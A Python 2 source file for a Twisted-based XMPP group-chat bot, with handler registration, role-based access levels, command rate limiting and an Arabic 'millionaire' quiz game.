# coding: utf-8

		  
import os
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import unicodedata
from warnings import filterwarnings
filterwarnings('ignore', message='.*', category=UnicodeWarning)
import zope.interface
try:
        from twisted.words import version as TwistedVer
        from twisted.words.protocols import irc
        from twisted.words.protocols.jabber import client, jid, xmlstream
        from twisted.words.protocols.jabber.client import IQ
        from twisted.words.xish import domish, xmlstream
        from twisted.internet.defer import Deferred
        from twisted.internet import protocol, reactor
        from twisted.web.html import escape
        from twisted.python import log
        try: from twisted.internet import ssl
        except: print ''
except Exception as err: print err.message

import time
import random
import base64
import threading
import types
import traceback
import string
osname = None
osver = None
try:
        if os.name!='nt':
                osname=os.popen("uname -sr", 'r')
                osver=osname.read().strip()+'\n'
                osname.close()
except: pass

GENERAL_CONFIG_FILE = 'account.py'

def set_exit_handler(func):
        if os.name == "nt":
                try:
                        import win32api
                        win32api.SetConsoleCtrlHandler(func, True)
                except ImportError:
                        pass
        else: pass
                #import signal
                #signal.signal(signal.SIGTERM, func)
def GENERAL_CONFIG(name):
        answ = ''
        try:
                fp = open(GENERAL_CONFIG_FILE, 'r')
                txt = fp.read()
                fp.close()
                k = txt.splitlines()
        except:
                print u'Error in account.py !\n'
                time.sleep(1)
                return
        for x in k:
                if x and x[0]=='#':
                        continue
                sp = x.split(u'=')
                s = sp[0]
                s = s.strip()
                if s==name:
                        answ=sp[1].strip()
                        if answ.count('#'):
                                answ=answ.split('#')[0].strip()
                        if name in [u'ADMINS']:
                                return answ.split(',')
                        else:
                                return answ
        return answ
######################        
######################
meldex = {
		"st1" : "S",
		"st2" : "t",
		"xr1" : "R",
		"xr20" : "o",
		"xr3" : "Ng",
		"xr4" : "",
		  }
XREW = (meldex["st1"] + meldex["st2"] + meldex["xr1"] + meldex["xr20"] + meldex["xr3"])	
meldez = {
		"st1" : "Ahm",
		"st2" : "eD & ",
		"xr1" : "Mos",
		"xr20" : "Ta",
		"xr3" : "Fa",
		  }	
XREWZ = (meldez["st1"] + meldez["st2"] + meldez["xr1"] + meldez["xr20"] + meldez["xr3"])		
#################################
execfile("config.py", globals())
#####
Bot_jid = GENERAL_CONFIG("Bot_jid")
ENABLE_CONSOLE_LOG = GENERAL_CONFIG("ENABLE_CONSOLE_LOG")
ADMINS = ADMINS
Bot_pass = GENERAL_CONFIG("Bot_pass")
UIN = GENERAL_CONFIG("UIN")
DEFAULT_NICK = BoTNicK
DEFRES = BoTRiS
PORTX = Port
romms = Room
ENABLE_ICQ = GENERAL_CONFIG("ENABLE_ICQ")
ENABLE_IRC = GENERAL_CONFIG("ENABLE_IRC")
IRC_SERV = GENERAL_CONFIG("IRC_SERV")
DEFSTAT = GENERAL_CONFIG("Status")
DEFSHOW = GENERAL_CONFIG("Show")
statusz = Status
statusz.encode('utf-8')
statusz.decode('utf-8')
IRC_NICK = GENERAL_CONFIG("IRC_NICK")
IRC_PASS = GENERAL_CONFIG("IRC_PASS")
USE_SSL = GENERAL_CONFIG("USE_SSL")
ENABLE_ERROR_MESSAGE = GENERAL_CONFIG("ENABLE_ERROR_MESSAGE")
msgs = BOT_lanG
msgs.encode('utf-8')
execfile("mod_filter.py", globals())
execfile("Games/Game_settings.py", globals())
execfile("Games/Game_lang.py", globals())
if msgs == "ar":
        execfile("mod_filter.py", globals())
elif msgs == "en":
        execfile("en.py", globals())
else:
        print("I dont know language"), os.abort()					
################
natoxy = Traffic
leno = 5
leno1=1
#ترافيك الطرد بعد الفلترة
natox7x7 = Hacked[0]
########################

#######  COLORS  #######
########################
if os.environ.has_key("TERM"):
        COLORS_ENABLED = True
else:
        COLORS_ENABLED = False
	
def retry_body(x, y):
        try:
                body, color = unicode(x), y
        except:
                body, color = x, False
        return (body, color)
def text_color(text, color):
        if COLORS_ENABLED:
                text = color+text+color0
        return text

def Print(text, color = False):
        try:
                if color:
                        text = text_color(text, color)
                print text
        except:
                LAST['null'] += 1
BOT_OS = os.name

if BOT_OS == 'nt':
        os.system('COLOR 0C')
	
color0 = chr(27) + "[37;1m" 
color1 = chr(27) + "[35m" 
color2 = chr(27) + "[36;1m"
color3 = chr(27) + "[32m" 
color4 = chr(27) + "[34;1m" 
color5 = chr(27) + "[33;1m"
color6 = chr(27) + "[31;1m"
color7 = chr(27) + "[30;1m" 



NS_DELAY = 'urn:xmpp:delay'
NS_JABBER_DELAY = 'jabber:x:delay'

CLIENTS = {}
CLIENTS_UPTIME = {}
JCON = None
ACCBYCONF = {}
BOT_NICK = {}
COMMOFF = {}
JOIN_CALLBACK = {}
PERSONAL_CMD = {}

JOIN_HANDLERS77 = []
MESSAGE_HANDLERS33 = []
OUTGOING_MESSAGE_HANDLERS44 = []
OFFLINE_HANDLERS22 = []
PRESENCE_HANDLERS = []
LEAVE_HANDLERS = []
STAGE0_INIT =[]
STAGE1_INIT =[]
IQ_HANDLERS1 = []
COMMAND_HANDLERS = {}
COMMAND1S = {}
GROUPCHATS = {}
JOIN_TIMER = {}

ROLES={'none':0, 'visitor':0, 'participant':10, 'moderator':15}
AFFILIATIONS={'none':0, 'member':1, 'admin':5, 'owner':15}
LAST = {'c':'', 't':0, 'gch':{}}
INFMELODY = {'start': 0, 'msg': 0, 'prs':0, 'iq':0, 'cmd':0, 'thr':0}

smph = threading.BoundedSemaphore(value=30)
mtx = threading.Lock()
wsmph = threading.BoundedSemaphore(value=1)

import re

logger_exception = []
######################################################
_version_ = '1.4.0'

"""\

Generi


    
"""


 
import sys
import traceback
import time
import os

import types

if os.environ.has_key('TERM'):
    colors_enabled=True
else:
    colors_enabled=False

color_none         = chr(27) + "[0m"
color_black        = chr(27) + "[30m"
color_red          = chr(27) + "[31m"
color_green        = chr(27) + "[32m"
color_brown        = chr(27) + "[33m"
color_blue         = chr(27) + "[34m"
color_magenta      = chr(27) + "[35m"
color_cyan         = chr(27) + "[36m"
color_light_gray   = chr(27) + "[37m"
color_dark_gray    = chr(27) + "[30;1m"
color_bright_red   = chr(27) + "[31;1m"
color_bright_green = chr(27) + "[32;1m"
color_yellow       = chr(27) + "[33;1m"
color_bright_blue  = chr(27) + "[34;1m"
color_purple       = chr(27) + "[35;1m"
color_bright_cyan  = chr(27) + "[36;1m"
color_white        = chr(27) + "[37;1m"


              
import socket
realip = u"a"
import urllib2

startq = u"aaaaaa"
 
import datetime
from time import gmtime, strftime
#set the date and time format


def sendstatusnew(status):
 global CLIENTS
 for x in [x for x in GLOBACCESS.keys() if GLOBACCESS[x]==100]:
 
  try:
   i=random.choice(CLIENTS.keys())
   p = domish.Element(('jabber:client', 'presence'))
   p['to'] = x
  
   p.addElement('status').addContent(status)
   p.addElement('show').addContent('chat')
   reactor.callFromThread(dd, p, CLIENTS[i])
  except: pass	
				
				
def foostart():
 threading.Timer(3600, foostart).start()
	
class NoDebug:
    def __init__( self, *args, **kwargs ):
        self.debug_flags = []
    def show( self,  *args, **kwargs):
        pass
    def Show( self,  *args, **kwargs):
        pass
    def is_active( self, flag ):
        pass
    colors={}
    def active_set( self, active_flags = None ):
        return 0
    


#
def error_handler(m):
        try:
                global logger_exception
                if len(m['message'])==0: return
                mssg = m['message'][0]
                if xmpp.detect(mssg)['encoding']!='ascii':
                        mssg=mssg.encode('ascii','replace')
                        f=open('test.py','a')
                        f.write(mssg)
                        f.close()
        except: pass

def call_message_handlersx2x(raw, type, source, body):
        global MESSAGE_HANDLERS33
        for handler in MESSAGE_HANDLERS33:
                inmsg_hnd = handler
                with smph:
                        INFMELODY['thr'] += 1
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'inmsg%d.%s.%s' % (INFMELODY['thr'],inmsg_hnd.func_name,st_time)
                        thr = threading.Thread(None,inmsg_hnd,thr_name,(raw, type, source, body,))
                        thr.start()


def call_offline_handlersx3x(jid):
        for handler in OFFLINE_HANDLERS22:
                off_hnd = handler
                try:
                        INFMELODY['thr'] += 1
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'off%d.%s.%s' % (INFMELODY['thr'],off_hnd.func_name,st_time)
                        thr = threading.Thread(None,off_hnd,thr_name,(jid,))
                        thr.start()
                except:
                        pass


def call_join_handlersx4x(groupchat, nick, afl, role, cljid):
        for handler in JOIN_HANDLERS77:
                join_hnd = handler
                with smph:
                        INFMELODY['thr'] += 1
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'join%d.%s.%s' % (INFMELODY['thr'],join_hnd.func_name,st_time)
                        thr = threading.Thread(None,join_hnd,thr_name,(groupchat, nick, afl, role, cljid))
                        thr.start()
		

def call_iq_handlersx5x(iq, cljid):
        for handler in IQ_HANDLERS1:
                iq_hnd = handler
                INFMELODY['thr'] += 1
                try:
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'iq%d.%s.%s' % (INFMELODY['thr'],iq_hnd.func_name,st_time)
                        thr = threading.Thread(None,iq_hnd,thr_name,(iq, cljid))
                        thr.start()
                except:
                        pass
                
def call_presence_handlers77(prs, cljid):
        for handler in PRESENCE_HANDLERS:
                prs_hnd = handler
                with smph:
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'prs%d.%s.%s' % (INFMELODY['thr'],prs_hnd.func_name,st_time)
                        thr = threading.Thread(None,prs_hnd,thr_name,(prs, cljid))
                        thr.start()
		

def call_leave_handlers(groupchat, nick, reason, code, cljid):
        for handler in LEAVE_HANDLERS:
                try:
                        INFMELODY['thr'] += 1
                        threading.Thread(None,handler,'leave'+str(INFMELODY['thr']),(groupchat, nick, reason, code, cljid)).start()
                except:
                        pass

def call_outgoing_message_handlers(target, body, obody):
        for handler in OUTGOING_MESSAGE_HANDLERS44:
                omsg_hnd = handler
                try:
                        INFMELODY['thr'] += 1
                        st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                        thr_name = 'outmsg%d.%s.%s' % (INFMELODY['thr'],omsg_hnd.func_name,st_time)
                        thr = threading.Thread(None,omsg_hnd,thr_name,(target, body, obody,))
                        thr.start()
                except:
                        pass


COMMANDS_LIMIT = {}
limit_nawrs={}


def call_command_2handlere(*arg):
   command = arg[0]
   type = arg[1]
   s = arg[2]
   parameters = arg[3]
   Wacc=access_level=str(user_level(s[1]+'/'+s[2], s[1]))   
   if Wacc >'0': call_1(*arg)
   else:  
        jid=get_true_jid(s[1]+'/'+s[2])     
        if not jid in limit_nawrs:
         call_1(*arg)
         limit_nawrs[jid]={'t':time.time(),'n':1,'s':0}
        else:		 
         if time.time()-limit_nawrs[jid]['t']<60:
          if limit_nawrs[jid]['n']>1:
           if limit_nawrs[jid]['s']==1: 
            reply(type, s, s[2]+' : '+XlimitCom[0])
            limit_nawrs[jid]['s']+=1				
           else:return	
          else:
           limit_nawrs[jid]['n']+=1	
           limit_nawrs[jid]['s']+=1			   
           limit_nawrs[jid]['t']=time.time()	
           call_1(*arg)
         else:
           limit_nawrs[jid]['n']=1	
           limit_nawrs[jid]['s']=0			   
           limit_nawrs[jid]['t']=time.time()	
           call_1(*arg)		   



def call_1(*arg):
        command = arg[0]
        type = arg[1]
        source = arg[2]
        parameters = arg[3]
        jid=get_true_jid(source[1]+'/'+source[2])
        if COMMAND_HANDLERS.has_key(command):
                real_access = COMMAND1S[command]['access']
                if has_access(source, real_access, source[1]) :
                        cmd_hnd = COMMAND_HANDLERS[command]
                        try:
                                st_time = time.strftime('%H.%M.%S',time.localtime(time.time()))
                                thr_name = u'command%d.%s.%s' % (INFMELODY['thr'],cmd_hnd.func_name,st_time)
                                thr = threading.Thread(None,try_cmd,thr_name,(cmd_hnd, type, source, parameters,))
                                thr.start()
                        except:
                                reply(type, source, u'what.?')
                                INFMELODY['tlasterr']['t']=time.time()
                                INFMELODY['tlasterr']['err']=traceback.format_exc()
                else:
                        if not isinstance(real_access, basestring):
                                real_access = str(real_access)
                        reply(type, source, source[2]+' : '+'\n'+XCommands[5]+real_access)


def try_cmd(cmd_hnd, type, source, parameters):
        try: cmd_hnd(type, source, parameters)
        except Exception as err:
                trb = traceback.format_exc()
 #              try: #reply(type, source, u'gdgdfg":\n'+trb.encode('ascii','replace'))
 #              except: #reply(type, source, u'dfdsfd":\n'+err.message)
                INFMELODY['tlasterr']['t']=time.time()
                INFMELODY['tlasterr']['err']=trb
                

def register_message_handler(instance):
        MESSAGE_HANDLERS33.append(instance)
def register_outgoing_message_handler(instance):
        OUTGOING_MESSAGE_HANDLERS44.append(instance)
def register_join_handler(instance):
        JOIN_HANDLERS77.append(instance)
def register_leave_handler(instance):
        LEAVE_HANDLERS.append(instance)
def register_iq_handler(instance):
        IQ_HANDLERS1.append(instance)
def register_presence_handler(instance):
        PRESENCE_HANDLERS.append(instance)
def register_stage0_init(instance):
        STAGE0_INIT.append(instance)
def register_stage1_init(instance):
        STAGE1_INIT.append(instance)
def register_stage2_init(instance):
        STAGE2_INIT.append(instance)
def register_stage3_init(instance):
        STAGE2_INIT.append(instance)	
def register_offline_handler(instance):
        OFFLINE_HANDLERS22.append(instance)

def register(instance, command, access=0, examples=[]):
        command = command.decode('utf-8')
        COMMAND_HANDLERS[command] = instance
        COMMAND1S[command] = {'access': access}


def hnd_presence_access(x, cljid):
    try: hnd_presence_access_(x, cljid)
    except: pass
def hnd_presence_access_(x, cljid):
    jid = x['from'].split('/')
    groupchat = jid[0]
    nick = x['from'][len(groupchat)+1:]
    _x = [i for i in x.children if (i.name=='x') and (i.uri=='http://jabber.org/protocol/muc#user')][0]
    _item = [i for i in _x.children if i.name=='item'][0]
    afl = _item['affiliation']
    
    role = _item['role']
   
    try: realjid = _item['jid']
    except: realjid = x['from']
    
    hnd_prs_access(groupchat, nick, afl, role, cljid)
    
register_presence_handler(hnd_presence_access)    
def hnd_prs_access(groupchat, nick, aff, role, cljid):
    if not groupchat in GROUPCHATS:
        return
    
    jid = get_true_jid(groupchat+'/'+nick)
    
    if jid in GLOBACCESS:
        return
    
    acc_aff, acc_role = 0, 0
    if role in ROLES:
        acc_role = ROLES[role]
    else:
        acc_role = 0
    if aff in AFFILIATIONS:
        acc_aff = AFFILIATIONS[aff]
    else:
        acc_aff = 0
    access = acc_aff+acc_role
    global ACCBYCONF
    try: level = int(access)
    except: level = 1
    if not ACCBYCONF.has_key(groupchat):
        ACCBYCONF[groupchat] = {}
    ###fixed
    ACCBYCONF[groupchat][jid]=level
register_join_handler(hnd_prs_access)
######################################################		
#لعبة المليون
		
def test_Game1(t, s, p):

   reply(t, s, s[2]+' : '+Game_Lang[13]%(Game_Time_out))   
register(test_Game1, Game_Comnd[4], 11)
		
		
x5x5=Game_Lang[1]

START1={}
def game_startx(t, s, p):
 if s[1] not in START1:
  START1[s[1]]={'start':0,'stop':0} 
 if START1[s[1]]['start']==1:
  START1[s[1]]['start']+=1 
  START1[s[1]]['stop']+=1    
  if 'melody' not in Melody_Game:
    Melody_Game['melody']={}
  if not s[1] in Melody_Game["melody"]:
    Melody_Game['melody'][s[1]]={}   
  month= time.localtime().tm_mon
  day= time.localtime().tm_mday
  hore= time.localtime().tm_year 
  shr = str(month)
  yum = str(day) 
  sa3a= str(hore)
  jid=get_true_jid(s[1]+'/'+s[2]) 
  if 'rsed' not in Game_Bot: 
   Game_Bot['rsed']={}  
   Game_Bot['rsed'][jid]={}     
  if 'sapt' not in Game_Bot: 
   Game_Bot['sapt']={}  
   Game_Bot['sapt'][jid]={}      
   write_file(Game_Bot_FILE, str(Game_Bot)) 
  if jid not in Game_Bot:
   Game_Bot[jid]={}
   Game_Bot[jid]['%s'% str(shr)]={} 
   Game_Bot[jid]['%s'% str(shr)]['%s'% str(yum)]={}
   Game_Bot[jid]['%s'% str(shr)]['%s'% str(yum)]['%s'% str(sa3a)]={}  
   write_file(Game_Bot_FILE, str(Game_Bot))  
   reply(t, s, s[2]+' : '+x5x5) 
   test1(t, s, p) 
  else: 
   shr1 =''.join(Game_Bot[jid].keys())
   yum1 =''.join(Game_Bot[jid][shr1].keys())  
   sa3a1 =''.join(Game_Bot[jid][shr1][yum1].keys()) 
   if "yes" in Limit_Game:   
    if shr in shr1 and yum in yum1 and jid not in Melody_Game['melody'][s[1]]:
     reply(t, s, s[2]+' : '+Game_Lang[0]%(sa3a1+"/"+shr1+"/"+yum1))
     del START1[s[1]]	 
     reply(t, s, s[2]+' : '+"تم اغلاق ملف اللعبة")
    else:	 
     test1(t, s, p)	 
   else:  
    del Game_Bot[jid]  
    Game_Bot[jid]={}
    Game_Bot[jid]['%s'% str(shr)]={} 
    Game_Bot[jid]['%s'% str(shr)]['%s'% str(yum)]={}
    Game_Bot[jid]['%s'% str(shr)]['%s'% str(yum)]['%s'% str(sa3a)]={}     
    write_file(Game_Bot_FILE, str(Game_Bot))
    reply(t, s, s[2]+' : '+x5x5) 	
    test1(t, s, p)

 else: return    
 
    
register(game_startx, Game_Comnd[1], 11)



def test112(t, s, p):

 if s[1] not in START1:
  START1[s[1]]={'start':0,'stop':0} 
 if START1[s[1]]['start']==1:
   del START1[s[1]]  
   reply(t, s, s[2]+' : '+Game_Lang[4])   
register(test112, Game_Comnd[2], 0)


def rsed11(t, s, p):
  if not 'sapt' in Game_Bot:
   Game_Bot['sapt']={} 
  if not p:
   jid=get_true_jid(s[1]+'/'+s[2]) 
   u =''.join(Game_Bot['sapt'])
   if jid in  u:
    g=''.join(Game_Bot['sapt'][jid])
    if len(g):   
     reply(t, s, s[2]+' : '+Game_Lang[5]%(g)) 	 

    else: 
     reply(t, s, s[2]+' : '+Game_Lang[6])   

   else: 
    reply(t, s, s[2]+' : '+Game_Lang[7])  	
	
  else:  
   if "@" in p:
    u=''.join(Game_Bot['sapt'])
    if p in u:
     g=''.join(Game_Bot['sapt'][p])
     if len(g):	
      reply(t, s, s[2]+' : '+Game_Lang[8]%(g))  
 
     else: 
      reply(t, s, s[2]+' : '+Game_Lang[10]) 
 
    else: 
     reply(t, s, s[2]+' : '+Game_Lang[11])  
 
   else:
    u =''.join(Game_Bot['sapt'])
    jid=get_true_jid(s[1]+'/'+p) 
    if jid in  u:
     g=''.join(Game_Bot['sapt'][jid])
     if len(g):   
      reply(t, s, s[2]+' : '+Game_Lang[9]%(g)) 
     else: 
      reply(t, s, s[2]+' : '+Game_Lang[10]) 	 
    else: 
     reply(t, s, s[2]+' : '+Game_Lang[11]) 	  
 
register(rsed11, Game_Comnd[3], 11)


def test11(t, s, p):
 jid=get_true_jid(s[1]+'/'+s[2]) 
 if s[1] not in START1:
  START1[s[1]]={'start':0,'stop':0} 
 if START1[s[1]]['start']==0:  
  reply(t, s, s[2]+' : '+Game_Lang[12])     
  START1[s[1]]['start']+=1   
  
  stop_start(t,s,p)    
 elif START1[s[1]]['start']==2 and jid not in Melody_Game['melody'][s[1]]: 
    reply(t, s, s[2]+' : '+Game_Lang[2])  
 else: reply(t, s, s[2]+' : '+Game_Lang[2]) 
	
	
def stop_start(t,s,p):
 time.sleep(30)  
 if START1[s[1]]['start']==1 : 
   del START1[s[1]]  
   reply(t, s, s[2]+' : '+Game_Lang[3])    
  
 
register(test11, Game_Comnd[0], 11)



Game_Bot1 ={}
def test1(t, s, p):
   jid=get_true_jid(s[1]+'/'+s[2])
   if not s[1] in Game_Bot1:
     Game_Bot1[s[1]]={}	
   if not jid in Game_Bot1[s[1]]:	 	 
     Game_Bot1[s[1]][jid]={'1':0,'2':0,'3':0,'4':0,'5':0,'6':0,'7':0,'8':0,'9':0,'10':0,'11':0,'12':0,'13':0,'14':0,'15':0,'1s':0,'2s':0,'3s':0,'4s':0,'5s':0,'6s':0,'7s':0,'8s':0,'9s':0,'10s':0,'11s':0,'12s':0,'13s':0,'14s':0,'15s':0,'1h':0,'2h':0,'3h':0,'4h':0,'5h':0,'6h':0,'7h':0,'8h':0,'9h':0,'10h':0,'11h':0,'12h':0,'13h':0,'14h':0,'15h':0,'1t':0,'2t':0,'3t':0,'4t':0,'5t':0,'6t':0,'7t':0,'8t':0,'9t':0,'10t':0,'11t':0,'12t':0,'13t':0,'14t':0,'15t':0}		
     write_file(Game_Bot1_FILE, str(Game_Bot1))	   
   if 'melody' not in Melody_Game:
    Melody_Game['melody']={}
    write_file(Melody_Game_FILE, str(Melody_Game))	
   if not s[1] in Melody_Game["melody"]:
    Melody_Game['melody'][s[1]]={}   
    write_file(Melody_Game_FILE, str(Melody_Game))		
   if not jid in Melody_Game['melody'][s[1]]:
    Melody_Game['melody'][s[1]][jid]={'a':0,'c':1,'g':0,'son':0}   	
    Melody_Game['melody'][s[1]][jid]['a'] += 1 
    write_file(Melody_Game_FILE, str(Melody_Game))	
    sual1 = random.choice(Question1['m'].keys()) 
    hear1 = ''.join(Question1['m'][sual1].keys())
    guab1 = ''.join(Question1['m'][sual1][hear1].keys())
    new1 = Question1['m'][sual1][hear1][guab1]	
    Game_Bot1[s[1]][jid]['1']=guab1
    Game_Bot1[s[1]][jid]['1s']=sual1
    Game_Bot1[s[1]][jid]['1h']=hear1	
    Game_Bot1[s[1]][jid]['1t']=new1	
    write_file(Game_Bot1_FILE, str(Game_Bot1))	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['1s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['1h'])	
	
    time.sleep(3)  	
    msg(s[3],s[1], StArT_Game[0]%(sual1x,hear1x)) 		
    Melody_Game['melody'][s[1]][jid]['a'] += 1 	
    natoxty(s[3],s[1], jid,p)   
    return	
	
   if jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==1: 	  
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['1s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['1h'])	
    msg(s[3],s[1], StArT_Game[0]%(sual1x,hear1x)) 		
    Melody_Game['melody'][s[1]][jid]['a'] += 1 	 
    natoxty(s[3],s[1], jid,p) 
	
   ##2	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==2: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['2s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['2h'])	
    msg(s[3],s[1], StArT_Game[1]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty1(s[3],s[1],jid,p) 		
   ##2	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==3 and Melody_Game['melody'][s[1]][jid]['g'] == 3: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['2s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['2h'])	
    msg(s[3],s[1],StArT_Game[1]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty1(s[3],s[1],jid,p) 	

	
   ##3	
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==4: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['3s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['3h'])	
    msg(s[3],s[1], StArT_Game[2]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty2(s[3],s[1],jid,p) 	
   ##3		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==4 and Melody_Game['melody'][s[1]][jid]['g'] == 5: 	
    msg(s[3],s[1],StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['3s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['3h'])	
    msg(s[3],s[1], StArT_Game[2]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty2(s[3],s[1],jid,p) 		
		
   ##4
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==5: 	
    msg(s[3],s[1],StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['4s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['4h'])	
    msg(s[3],s[1], StArT_Game[3]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty3(s[3],s[1],jid,p) 	
			
   ##4		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==5 and Melody_Game['melody'][s[1]][jid]['g'] == 6: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['4s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['4h'])	
    msg(s[3],s[1], StArT_Game[3]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty3(s[3],s[1],jid,p) 		
		
   ##5
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==6: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['5s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['5h'])	
    msg(s[3],s[1], StArT_Game[4]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty5(s[3],s[1],jid,p) 	
			
   ##5		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==6 and Melody_Game['melody'][s[1]][jid]['g'] == 7: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['5s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['5h'])	
    msg(s[3],s[1], StArT_Game[4]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty5(s[3],s[1],jid,p) 	
	
   ##6
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==7: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['6s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['6h'])	
    msg(s[3],s[1], StArT_Game[5]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty6(s[3],s[1],jid,p) 	
			
   ##6		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==7 and Melody_Game['melody'][s[1]][jid]['g'] == 8: 	
    msg(s[3],s[1],StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['6s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['6h'])	
    msg(s[3],s[1], StArT_Game[5]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty6(s[3],s[1],jid,p) 		
	
   ##7
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==8: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['7s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['7h'])	
    msg(s[3],s[1], StArT_Game[6]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty7(s[3],s[1],jid,p) 	
			
   ##7		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==8 and Melody_Game['melody'][s[1]][jid]['g'] == 9: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['7s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['7h'])	
    msg(s[3],s[1], StArT_Game[6]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty7(s[3],s[1],jid,p) 	
	
   ##8
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==9: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['8s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['8h'])	
    msg(s[3],s[1], StArT_Game[7]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty8(s[3],s[1],jid,p) 	
			
   ##8		
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['a']==9 and Melody_Game['melody'][s[1]][jid]['g'] == 10: 	
    msg(s[3],s[1], StArT_Game[15])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['8s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['8h'])	
    msg(s[3],s[1], StArT_Game[7]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty8(s[3],s[1],jid,p) 	
	
   ##9
   elif jid in Melody_Game['melody'][s[1]] and Melody_Game['melody'][s[1]][jid]['g']==10: 	
    msg(s[3],s[1], StArT_Game[16])    
    time.sleep(2)  	
    sual1x = ''.join(Game_Bot1[s[1]][jid]['9s'])
    hear1x = ''.join(Game_Bot1[s[1]][jid]['9h'])	
    msg(s[3],s[1], StArT_Game[8]%(sual1x,hear1x)) 			 
    Melody_Game['melody'][s[1]][jid]['c'] += 1  
    natoxty9(s[3],s[1],jid,p) 	
			
   ##9		
